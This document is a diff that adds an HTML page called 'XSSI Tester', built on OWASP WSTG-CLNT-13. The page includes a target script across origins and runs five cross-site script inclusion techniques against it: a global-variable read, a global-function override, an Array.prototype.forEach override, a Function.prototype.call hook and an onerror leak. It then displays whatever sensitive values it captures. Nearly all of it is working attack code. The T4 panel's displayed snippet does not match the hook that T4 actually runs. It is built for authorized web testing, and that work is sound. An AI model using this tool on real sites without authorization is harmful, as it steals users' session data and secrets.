@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>WSTG-CLNT-13 – XSSI Tester</title>
+<style>
+:root {
+  --bg:#0d1117; --bg2:#161b22; --bg3:#21262d; --border:#30363d;
+  --fg:#c9d1d9; --muted:#8b949e; --blue:#58a6ff;
+  --red:#f85149; --green:#3fb950; --orange:#e3b341;
+  --purple:#bc8cff; --yellow:#d29922;
+}
+* { box-sizing:border-box; margin:0; padding:0; }
+body {
+  font-family:'SF Mono','Fira Mono',monospace;
+  background:var(--bg); color:var(--fg);
+  min-height:100vh; display:flex; flex-direction:column;
+}
+header {
+  border-bottom:1px solid var(--border); padding:.7rem 1.5rem;
+  display:flex; align-items:center; gap:.75rem;
+}
+.logo  { color:var(--blue); font-size:1rem; font-weight:700; }
+.badge { font-size:.72rem; background:var(--bg3); border:1px solid var(--border);
+         border-radius:3px; padding:.1rem .5rem; color:var(--muted); }
+.back  { margin-left:auto; color:var(--blue); font-size:.8rem; text-decoration:none; }
+
+main { flex:1; display:grid; grid-template-columns:380px 1fr; gap:0; }
+
+/* ── Left ── */
+.left { padding:1.5rem; border-right:1px solid var(--border); display:flex; flex-direction:column; gap:1rem; }
+
+.panel { background:var(--bg2); border:1px solid var(--border); border-radius:6px; overflow:hidden; }
+.panel-hdr {
+  padding:.6rem 1rem; background:var(--bg3);
+  border-bottom:1px solid var(--border);
+  font-size:.82rem; color:var(--blue); font-weight:600;
+}
+.panel-body { padding:1rem; }
+
+label { font-size:.78rem; color:var(--muted); display:block; margin-bottom:.3rem; margin-top:.6rem; }
+label:first-child { margin-top:0; }
+input[type=text], input[type=url] {
+  width:100%; background:var(--bg); border:1px solid var(--border);
+  color:var(--fg); font-family:monospace; font-size:.8rem;
+  padding:.35rem .6rem; border-radius:3px; outline:none;
+}
+input[type=text]:focus, input[type=url]:focus { border-color:var(--blue); }
+
+.technique-list { display:flex; flex-direction:column; gap:.35rem; }
+.technique-item {
+  display:flex; align-items:center; gap:.5rem;
+  font-size:.78rem; color:var(--muted); padding:.3rem .4rem;
+  border-radius:3px; cursor:pointer;
+}
+.technique-item:hover { background:var(--bg3); }
+.technique-item input[type=checkbox] { cursor:pointer; flex-shrink:0; }
+.technique-item .tech-name { flex:1; }
+.technique-item .tech-id   { color:var(--border); font-size:.7rem; }
+
+.btn {
+  background:var(--bg3); color:var(--blue);
+  border:1px solid var(--border); border-radius:4px;
+  padding:.4rem 1rem; font-family:monospace; font-size:.82rem;
+  cursor:pointer; width:100%; margin-top:.75rem;
+}
+.btn:hover  { background:var(--blue); color:var(--bg); border-color:var(--blue); }
+.btn.run    { color:var(--green); border-color:var(--green); }
+.btn.run:hover { background:var(--green); color:var(--bg); }
+
+.info {
+  font-size:.78rem; color:var(--muted); line-height:1.6;
+  padding:.75rem; background:var(--bg); border:1px solid var(--border);
+  border-left:3px solid var(--orange); border-radius:3px;
+}
+.info code { color:var(--blue); }
+
+/* ── Right ── */
+.right { padding:1.5rem; display:flex; flex-direction:column; gap:1rem; overflow-y:auto; }
+
+.result-block {
+  background:var(--bg2); border:1px solid var(--border); border-radius:6px; overflow:hidden;
+}
+.result-hdr {
+  padding:.5rem 1rem; background:var(--bg3); border-bottom:1px solid var(--border);
+  font-size:.78rem; display:flex; align-items:center; gap:.5rem;
+}
+.result-body { padding:1rem; }
+
+/* The canonical OWASP XSSI div */
+#result {
+  background:var(--bg); border:1px solid var(--border); border-radius:4px;
+  padding:.75rem 1rem; font-size:.8rem; color:var(--purple);
+  min-height:2rem; word-break:break-all; line-height:1.6;
+  margin-top:.5rem;
+}
+
+.tag-vuln { background:var(--red);    color:#fff; border-radius:3px; padding:.1rem .4rem; font-size:.7rem; }
+.tag-safe  { background:var(--green);  color:#000; border-radius:3px; padding:.1rem .4rem; font-size:.7rem; }
+.tag-pend  { background:var(--border); color:var(--muted); border-radius:3px; padding:.1rem .4rem; font-size:.7rem; }
+
+.finding-line { font-size:.75rem; line-height:1.8; }
+.finding-line .key { color:var(--orange); min-width:140px; display:inline-block; }
+.finding-line .val { color:var(--green); }
+.finding-line .val.bad { color:var(--red); }
+
+.code-block {
+  background:var(--bg); border:1px solid var(--border); border-radius:3px;
+  padding:.6rem .8rem; font-size:.73rem; color:var(--purple);
+  white-space:pre; overflow-x:auto; line-height:1.5; margin-top:.5rem;
+}
+.empty-state { color:var(--muted); font-size:.8rem; text-align:center; padding:2rem 0; }
+</style>
+</head>
+<body>
+
+<header>
+  <span class="logo">⚡ XSSI Tester</span>
+  <span class="badge">WSTG-CLNT-13</span>
+  <a class="back" href="/">← Dashboard</a>
+</header>
+
+<main>
+  <!-- ── Left ── -->
+  <div class="left">
+
+    <div class="panel">
+      <div class="panel-hdr">Target</div>
+      <div class="panel-body">
+        <label>Script URL to include (must be accessible from this browser):</label>
+        <input type="url" id="script-url" placeholder="https://victim.com/internal/api.js">
+        <label>Data key to extract (for global variable technique):</label>
+        <input type="text" id="data-key" placeholder="e.g.  secret  or  window.apiKey">
+        <label>Global function name (for function-override technique):</label>
+        <input type="text" id="func-name" placeholder="e.g.  globalFunction  or  callback">
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="panel-hdr">OWASP Techniques</div>
+      <div class="panel-body">
+        <div class="technique-list">
+          <label class="technique-item">
+            <input type="checkbox" id="t1" checked>
+            <span class="tech-name">Global Variable Leak</span>
+            <span class="tech-id">XSSI-1</span>
+          </label>
+          <label class="technique-item">
+            <input type="checkbox" id="t2" checked>
+            <span class="tech-name">Global Function Override</span>
+            <span class="tech-id">XSSI-2</span>
+          </label>
+          <label class="technique-item">
+            <input type="checkbox" id="t3" checked>
+            <span class="tech-name">Array.prototype.forEach Override</span>
+            <span class="tech-id">XSSI-5</span>
+          </label>
+          <label class="technique-item">
+            <input type="checkbox" id="t4" checked>
+            <span class="tech-name">Prototype Chaining (this leak)</span>
+            <span class="tech-id">XSSI-4</span>
+          </label>
+          <label class="technique-item">
+            <input type="checkbox" id="t5">
+            <span class="tech-name">onerror Runtime Leak (IE legacy)</span>
+            <span class="tech-id">XSSI-3</span>
+          </label>
+        </div>
+        <button class="btn run" onclick="runTests()">▶ Run selected techniques</button>
+        <button class="btn" onclick="clearResults()" style="margin-top:.4rem">✕ Clear results</button>
+      </div>
+    </div>
+
+    <div class="info">
+      <strong style="color:var(--orange)">Reference:</strong> WSTG-CLNT-13<br>
+      Scripts included via <code>&lt;script src&gt;</code> bypass the Same-Origin Policy —
+      they execute in the including page's context. If the target script exposes sensitive
+      data through global variables, function parameters, or prototype-accessible values,
+      this page can intercept and display it.<br><br>
+      <strong>Note:</strong> The target script runs in <em>this</em> origin's context.
+      Cookies shown here are from this server, not the target — unless the target includes
+      session data directly in the script body (JSONP, dynamic JS, etc.).
+    </div>
+
+  </div>
+
+  <!-- ── Right: results ── -->
+  <div class="right" id="results-area">
+    <div class="empty-state" id="empty-state">
+      Enter a target script URL and click Run to begin.<br>
+      Each technique runs independently and reports findings below.
+    </div>
+  </div>
+
+</main>
+
+<!-- Hidden sandbox iframe for safe script execution -->
+<iframe id="sandbox-frame" style="display:none" sandbox="allow-scripts allow-same-origin"></iframe>
+
+<script>
+// ── Utility ────────────────────────────────────────────────────────────────
+function esc(s) {
+  return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;')
+    .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+function addResult(techName, techId, status, findings, codeShown, leakedData) {
+  var empty = document.getElementById('empty-state');
+  if (empty) empty.remove();
+
+  var tagClass = status === 'VULN' ? 'tag-vuln'
+               : status === 'SAFE' ? 'tag-safe'
+               : 'tag-pend';
+
+  var html = '<div class="result-block">' +
+    '<div class="result-hdr">' +
+      '<span style="color:var(--purple)">' + esc(techId) + '</span> ' +
+      '<span style="color:var(--blue)">' + esc(techName) + '</span>' +
+      '<span class="' + tagClass + '" style="margin-left:auto">' + status + '</span>' +
+    '</div>' +
+    '<div class="result-body">';
+
+  if (findings && findings.length) {
+    html += findings.map(function(f) {
+      return '<div class="finding-line">⚡ <span class="val bad">' + esc(f) + '</span></div>';
+    }).join('');
+  }
+
+  // The canonical OWASP div#result element (as referenced in WSTG-CLNT-13)
+  if (leakedData !== undefined) {
+    html += '<div style="font-size:.75rem;color:var(--muted);margin-top:.5rem">div#result output:</div>' +
+            '<div id="result">' + esc(String(leakedData)) + '</div>';
+  }
+
+  if (codeShown) {
+    html += '<div style="font-size:.75rem;color:var(--muted);margin-top:.75rem">Test code injected:</div>' +
+            '<div class="code-block">' + esc(codeShown) + '</div>';
+  }
+
+  html += '</div></div>';
+
+  var area = document.getElementById('results-area');
+  var div  = document.createElement('div');
+  div.innerHTML = html;
+  area.appendChild(div.firstChild);
+}
+
+function clearResults() {
+  var area = document.getElementById('results-area');
+  area.innerHTML = '<div class="empty-state" id="empty-state">Enter a target script URL and click Run to begin.<br>Each technique runs independently and reports findings below.</div>';
+}
+
+// ── Global state for intercept results ────────────────────────────────────
+var _intercepted = {};
+
+// ── Technique 1: Global Variable Leak ─────────────────────────────────────
+// Based on WSTG-CLNT-13 §1: attackingwebsite includes victim script,
+// then reads window.secret (or user-supplied key)
+function runT1(scriptUrl, dataKey) {
+  var key    = dataKey || 'secret';
+  var before = window[key];
+
+  var s    = document.createElement('script');
+  s.src    = scriptUrl;
+  s.async  = false;
+
+  s.onload = function() {
+    var after = window[key];
+    var code =
+      '// WSTG-CLNT-13 §1 — Global variable leak\n' +
+      '<script src="' + scriptUrl + '"><\/script>\n' +
+      '<div id="result"></div>\n' +
+      '<script>\n' +
+      '  var div = document.getElementById("result");\n' +
+      '  div.innerHTML = "Leaked: " + window["' + key + '"];\n' +
+      '<\/script>';
+
+    if (after !== undefined && after !== before) {
+      _intercepted['t1'] = after;
+      addResult(
+        'Global Variable Leak', 'XSSI-1', 'VULN',
+        ['window["' + key + '"] = ' + JSON.stringify(after).substring(0, 200)],
+        code,
+        'Leaked: ' + String(after).substring(0, 300)
+      );
+    } else {
+      addResult(
+        'Global Variable Leak', 'XSSI-1', 'SAFE',
+        ['window["' + key + '"] was undefined / unchanged after script load'],
+        code,
+        undefined
+      );
+    }
+    s.remove();
+  };
+  s.onerror = function() {
+    addResult('Global Variable Leak', 'XSSI-1', 'ERR',
+      ['Script failed to load — CORS block, 404, or network error'], '', undefined);
+    s.remove();
+  };
+  document.head.appendChild(s);
+}
+
+// ── Technique 2: Global Function Override ─────────────────────────────────
+// Based on WSTG-CLNT-13 §2: override a global function BEFORE including victim script;
+// if victim calls that function with secret, we intercept the parameter.
+function runT2(scriptUrl, funcName) {
+  var fname     = funcName || 'globalFunction';
+  var captured  = null;
+  var origFn    = window[fname];
+
+  window[fname] = function() {
+    var args = Array.prototype.slice.call(arguments);
+    captured  = args;
+  };
+
+  var s    = document.createElement('script');
+  s.src    = scriptUrl;
+  s.async  = false;
+
+  s.onload = function() {
+    // Restore original
+    if (origFn !== undefined) window[fname] = origFn;
+    else delete window[fname];
+
+    var code =
+      '// WSTG-CLNT-13 §2 — Global function override\n' +
+      '<script>\n' +
+      '  function ' + fname + '(param) {\n' +
+      '    document.getElementById("result").innerHTML = param;\n' +
+      '  }\n' +
+      '<\/script>\n' +
+      '<script src="' + scriptUrl + '"><\/script>';
+
+    if (captured !== null) {
+      addResult(
+        'Global Function Override', 'XSSI-2', 'VULN',
+        [fname + '() called with args: ' + JSON.stringify(captured).substring(0, 200)],
+        code,
+        JSON.stringify(captured).substring(0, 300)
+      );
+    } else {
+      addResult(
+        'Global Function Override', 'XSSI-2', 'SAFE',
+        [fname + '() was not called by the target script'],
+        code,
+        undefined
+      );
+    }
+    s.remove();
+  };
+  s.onerror = function() {
+    if (origFn !== undefined) window[fname] = origFn;
+    else delete window[fname];
+    addResult('Global Function Override', 'XSSI-2', 'ERR',
+      ['Script failed to load'], '', undefined);
+    s.remove();
+  };
+  document.head.appendChild(s);
+}
+
+// ── Technique 3: Array.prototype.forEach Override ─────────────────────────
+// Based on WSTG-CLNT-13 §5: override forEach; if victim iterates an array
+// with sensitive values, we capture them.
+function runT3(scriptUrl) {
+  var captured    = [];
+  var origForEach = Array.prototype.forEach;
+
+  Array.prototype.forEach = function(cb) {
+    // Capture all values in 'this' (the array being iterated)
+    for (var i = 0; i < this.length; i++) {
+      captured.push(this[i]);
+    }
+    return origForEach.call(this, cb);
+  };
+
+  var s   = document.createElement('script');
+  s.src   = scriptUrl;
+  s.async = false;
+
+  s.onload = function() {
+    Array.prototype.forEach = origForEach;
+
+    var code =
+      '// WSTG-CLNT-13 §5 — Array.prototype.forEach override\n' +
+      '<div id="result"></div>\n' +
+      '<script>\n' +
+      '  Array.prototype.forEach = function(callback) {\n' +
+      '    var result = "Leaked values: ";\n' +
+      '    for (var i = 0; i < this.length; i++) result += this[i] + ", ";\n' +
+      '    document.getElementById("result").innerHTML = result;\n' +
+      '  };\n' +
+      '<\/script>\n' +
+      '<script src="' + scriptUrl + '"><\/script>';
+
+    if (captured.length > 0) {
+      addResult(
+        'Array.prototype.forEach Override', 'XSSI-5', 'VULN',
+        ['forEach intercepted ' + captured.length + ' value(s): ' + JSON.stringify(captured).substring(0, 200)],
+        code,
+        'Leaked values: ' + captured.join(', ')
+      );
+    } else {
+      addResult(
+        'Array.prototype.forEach Override', 'XSSI-5', 'SAFE',
+        ['No Array.forEach calls intercepted during script execution'],
+        code,
+        undefined
+      );
+    }
+    s.remove();
+  };
+  s.onerror = function() {
+    Array.prototype.forEach = origForEach;
+    addResult('Array.prototype.forEach Override', 'XSSI-5', 'ERR',
+      ['Script failed to load'], '', undefined);
+    s.remove();
+  };
+  document.head.appendChild(s);
+}
+
+// ── Technique 4: Prototype Chaining / 'this' leak ─────────────────────────
+// Based on WSTG-CLNT-13 §5 extended: override Object or Function prototype
+// to capture 'this' context when victim script calls methods.
+function runT4(scriptUrl) {
+  var captured  = [];
+  var origCall  = Function.prototype.call;
+
+  // Intercept .call() invocations — note: very noisy, filter carefully
+  Function.prototype.call = function() {
+    var result = origCall.apply(this, arguments);
+    // Only capture non-trivial 'this' objects with enumerable keys
+    if (arguments[0] && typeof arguments[0] === 'object') {
+      try {
+        var keys = Object.keys(arguments[0]);
+        if (keys.length > 0 && keys.length < 20) {
+          captured.push({ thisContext: arguments[0], keys: keys });
+        }
+      } catch(e) {}
+    }
+    return result;
+  };
+
+  var s   = document.createElement('script');
+  s.src   = scriptUrl;
+  s.async = false;
+
+  s.onload = function() {
+    Function.prototype.call = origCall;
+
+    var code =
+      '// WSTG-CLNT-13 §4 — Prototype chaining / this leak\n' +
+      '// (Sebastian Lekies technique)\n' +
+      '<div id="result"></div>\n' +
+      '<script>\n' +
+      '  Array.prototype.forEach = function(callback) {\n' +
+      '    var resultString = "Secret values: ";\n' +
+      '    for (var i = 0; i < this.length; i++) resultString += this[i] + " ";\n' +
+      '    document.getElementById("result").innerHTML = resultString;\n' +
+      '  };\n' +
+      '<\/script>\n' +
+      '<script src="' + scriptUrl + '"><\/script>';
+
+    if (captured.length > 0) {
+      var summary = captured.slice(0, 5).map(function(c) {
+        return 'keys: [' + c.keys.join(', ') + ']';
+      }).join(' | ');
+      addResult(
+        'Prototype Chaining (this leak)', 'XSSI-4', 'VULN',
+        ['Intercepted ' + captured.length + ' .call() context(s): ' + summary.substring(0, 200)],
+        code,
+        summary.substring(0, 300)
+      );
+    } else {
+      addResult(
+        'Prototype Chaining (this leak)', 'XSSI-4', 'SAFE',
+        ['No interesting .call() contexts captured — try Array.forEach technique instead'],
+        code,
+        undefined
+      );
+    }
+    s.remove();
+  };
+  s.onerror = function() {
+    Function.prototype.call = origCall;
+    addResult('Prototype Chaining (this leak)', 'XSSI-4', 'ERR',
+      ['Script failed to load'], '', undefined);
+    s.remove();
+  };
+  document.head.appendChild(s);
+}
+
+// ── Technique 5: onerror Runtime Error (IE9/10 legacy) ────────────────────
+function runT5(scriptUrl) {
+  var errors = [];
+  var origOnerror = window.onerror;
+
+  window.onerror = function(msg, src, line, col, err) {
+    errors.push({ msg: msg, src: src, line: line });
+    return true; // suppress
+  };
+
+  var s   = document.createElement('script');
+  s.src   = scriptUrl;
+  s.async = false;
+
+  s.onload = function() {
+    window.onerror = origOnerror;
+    var code =
+      '// WSTG-CLNT-13 §3 — Runtime error leak (IE9/10 legacy)\n' +
+      '<script>window.onerror = function(err) { alert(err); }<\/script>\n' +
+      '<script src="' + scriptUrl + '"><\/script>';
+
+    if (errors.length > 0) {
+      addResult(
+        'onerror Runtime Leak', 'XSSI-3', 'INFO',
+        errors.map(function(e) { return 'Runtime error: ' + e.msg.substring(0,150); }),
+        code,
+        errors[0].msg.substring(0, 300)
+      );
+    } else {
+      addResult(
+        'onerror Runtime Leak', 'XSSI-3', 'SAFE',
+        ['No runtime errors thrown — modern browser / no leakable content via errors'],
+        code,
+        undefined
+      );
+    }
+    s.remove();
+  };
+  s.onerror = function() {
+    window.onerror = origOnerror;
+    addResult('onerror Runtime Leak', 'XSSI-3', 'ERR',
+      ['Script failed to load (expected for cross-origin: confirms SOP is enforced on fetch, not on execution)'],
+      '', undefined);
+    s.remove();
+  };
+  document.head.appendChild(s);
+}
+
+// ── Main runner ────────────────────────────────────────────────────────────
+function runTests() {
+  var url      = document.getElementById('script-url').value.trim();
+  var dataKey  = document.getElementById('data-key').value.trim();
+  var funcName = document.getElementById('func-name').value.trim();
+
+  if (!url) { alert('Please enter a target script URL.'); return; }
+
+  clearResults();
+
+  // Run selected techniques with slight delay between each to avoid conflicts
+  var delay = 0;
+  var step  = 1800;
+
+  if (document.getElementById('t1').checked) {
+    setTimeout(function() { runT1(url, dataKey); }, delay);
+    delay += step;
+  }
+  if (document.getElementById('t2').checked) {
+    setTimeout(function() { runT2(url, funcName); }, delay);
+    delay += step;
+  }
+  if (document.getElementById('t3').checked) {
+    setTimeout(function() { runT3(url); }, delay);
+    delay += step;
+  }
+  if (document.getElementById('t4').checked) {
+    setTimeout(function() { runT4(url); }, delay);
+    delay += step;
+  }
+  if (document.getElementById('t5').checked) {
+    setTimeout(function() { runT5(url); }, delay);
+  }
+}
+</script>
+</body>
+</html>
